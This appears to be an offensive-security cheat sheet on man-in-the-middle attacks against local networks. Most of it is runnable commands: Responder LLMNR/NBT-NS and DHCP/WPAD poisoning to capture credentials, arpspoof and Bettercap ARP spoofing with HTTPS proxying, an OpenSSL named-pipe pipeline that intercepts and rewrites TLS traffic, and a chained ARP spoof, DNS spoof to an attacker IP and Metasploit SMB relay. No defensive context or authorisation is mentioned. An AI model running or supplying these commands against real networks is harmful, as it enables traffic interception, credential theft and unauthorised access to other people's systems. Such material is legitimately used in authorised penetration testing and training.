MITM Attacks

Man-in-the-middle attacks on a local network — Responder passive/active modes for LLMNR/NBT-NS/mDNS, ARP poisoning with arpspoof, DHCP poisoning via Responder + WPAD, Bettercap end to end, OpenSSL TLS MITM with named pipes (traffic inspection and on-the-fly modification), and the full ARP spoof + DNS spoof + SMB relay chain.

Responder

Responder is used to capture LLMNR, NBT-NS, and MDNS requests without responding, or to actively respond and capture credentials.

responder -I eth0 -A          # See NBT-NS, BROWSER, LLMNR requests without responding
responder.py -I eth0 -wrf     # Active responder with Write, Relay, and Fingerprinting

Windows version: lgandx/Responder-Windows

MITM Attack Techniques

WSUS Poisoning

WSUS (Windows Server Update Services) poisoning can redirect vulnerable Windows clients to download malicious updates.

ARP Poisoning

ARP poisoning allows attackers to intercept traffic by spoofing ARP responses.

arpspoof [-i interface] [-c own|host|both] [-t target] [-r] host
arpspoof -i wlan0 -t 10.0.0.X 10.0.0.Y

DHCP Poisoning

Responder can perform DHCP poisoning with WPAD (Web Proxy Auto-Discovery):

responder --interface "eth0" --DHCP --wpad

Bettercap

Bettercap is a comprehensive MITM framework supporting spoofing, discovery, and sniffing.

sudo bettercap -iface wlan0

## Configure ARP spoofing for a target
net.probe on
set arp.spoof.targets <target_IP>
arp.spoof on

## Sniff network traffic
net.sniff on

## Additional: HTTP and HTTPS proxying
bettercap -X --proxy --proxy-https -T <target IP>

Features:

  • Better cap in spoofing, discovery, sniffer mode
  • Intercepting HTTP and HTTPS requests
  • Targeting specific IP only

SSL/TLS MITM with OpenSSL

Sniff and modify SSL traffic if a MITM vulnerability exists using only OpenSSL.

Setup

On client host (if you can modify /etc/hosts):

sudo echo "[OPENSSL_SERVER_ADDRESS] [domain.of.server.to.mitm]" >> /etc/hosts

On attacker's MITM server (generate self-signed certificate):

openssl req -subj '/CN=[domain.of.server.to.mitm]' -batch -new -x509 -days 365 -nodes -out server.pem -keyout server.pem

MITM Setup

Create named pipe and set up OpenSSL MITM infrastructure:

mkfifo response

## Listen on MITM interface, forward traffic to real server
sudo openssl s_server -cert server.pem -accept [INTERFACE]:[PORT] -quiet < response | \
    tee | \
    openssl s_client -quiet -servername [domain.of.server.to.mitm] -connect [IP_OF_SERVER]:[PORT] | \
    tee | \
    cat > response

Traffic modification: Use sed or other tools in the pipeline to modify traffic in real-time while displaying with tee.

Example: Intercepting and Displaying Traffic

mkfifo response

## Display traffic with tee (read-only inspection)
sudo openssl s_server -cert server.pem -accept 192.168.1.100:443 -quiet < response | \
    tee /tmp/client_to_server.txt | \
    openssl s_client -quiet -servername example.com -connect 10.0.0.1:443 | \
    tee /tmp/server_to_client.txt | \
    cat > response

Example: Modifying Traffic on-the-fly

mkfifo response

## Modify specific strings in traffic
sudo openssl s_server -cert server.pem -accept 192.168.1.100:443 -quiet < response | \
    sed 's/original_string/modified_string/g' | \
    openssl s_client -quiet -servername example.com -connect 10.0.0.1:443 | \
    sed 's/response_string/changed_response/g' | \
    cat > response

ARP Spoofing + DNS Spoofing + SMB Relay (Combined Attack)

Full MITM chain: intercept traffic via ARP spoofing, redirect DNS queries, and relay SMB authentication.

## Enable IP forwarding
echo 1 > /proc/sys/net/ipv4/ip_forward

## ARP spoof (bidirectional)
arpspoof -i eth1 -t <CLIENT_IP> <GATEWAY_IP>
arpspoof -i eth1 -t <GATEWAY_IP> <CLIENT_IP>

## DNS spoof
echo "<ATTACKER_IP> *.<DOMAIN>" > dns
dnsspoof -i eth1 -f dns

## SMB relay via MSF
use exploit/windows/smb/smb_relay
set SRVHOST <LHOST>
set SMBHOST <TARGET_IP>
exploit
